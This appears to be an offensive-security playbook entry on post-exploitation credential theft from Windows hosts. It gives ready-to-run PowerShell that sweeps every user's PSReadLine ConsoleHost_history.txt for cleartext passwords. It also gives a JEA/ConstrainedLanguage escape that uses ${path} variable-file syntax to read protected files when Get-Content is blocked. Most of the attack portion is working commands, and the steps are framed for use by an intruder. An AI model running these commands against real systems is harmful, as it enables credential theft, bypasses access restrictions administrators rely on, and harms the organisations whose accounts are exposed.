# PSReadLine History Goldmine

## When this applies

- Windows foothold (any user — even unprivileged WinRM).
- Goal: dump PowerShell command history files from every accessible profile to find cleartext credentials.

## Technique

`C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` often contains literal credentials in PSCredential one-liners (admins paste cleartext into `ConvertTo-SecureString -AsPlainText -Force` followed by `Enter-PSSession`/`Invoke-Command`).

Always read this file from every accessible profile (including service accounts whose profiles got created by interactive testing). Service-account profiles (`C:\Users\svc_*`, `C:\Users\<gMSA>$`) are especially valuable — admins use them to test JEA endpoints and leave creds in history.

## Steps

```powershell
# Sweep every accessible profile in one pass (no Get-ChildItem -Recurse required —
# faster and survives ConstrainedLanguage):
Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -ErrorAction SilentlyContinue |
  ForEach-Object { Write-Host "==== $($_.FullName) ===="; Get-Content $_ }
```

## JEA (RestrictedRemoteServer) escape — `${path}` variable-file syntax

When WinRM lands in a JEA endpoint with `LanguageMode=ConstrainedLanguage` and only ~8 visible cmdlets (no `Get-Content`, `Get-Item`, no FileSystem provider listed):

```powershell
# Standard reads fail:
Get-Content C:\path\file        # term not recognized
Get-Help -Path C:\path\file     # parameter not found
# BUT PowerShell variable-file syntax bypasses ConstrainedLanguage's provider visibility:
${C:\Users\target\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt}
${C:\Windows\System32\drivers\etc\hosts}
# Works because ${path} is parser-level, not cmdlet/provider-level — runs in restricted runspace
# but reads the file via the FileSystem provider implicitly
# Always try this when JEA blocks Get-Content; works on default RestrictedRemoteServer too
```

## Verifying success

- The history file content is dumped to the shell.
- Cleartext passwords / hashes / API keys appear in `ConvertTo-SecureString` one-liners or shell aliases.

## Common pitfalls

- Service-account profiles `C:\Users\svc_*` are often readable by other accounts via inheritance — sweep ALL profiles, not just the current user's.
- ConstrainedLanguage mode breaks `Get-Content` — use `${path}` variable-file syntax instead.

## Tools

- PowerShell (Get-ChildItem, Get-Content)
- `${...}` variable-file syntax
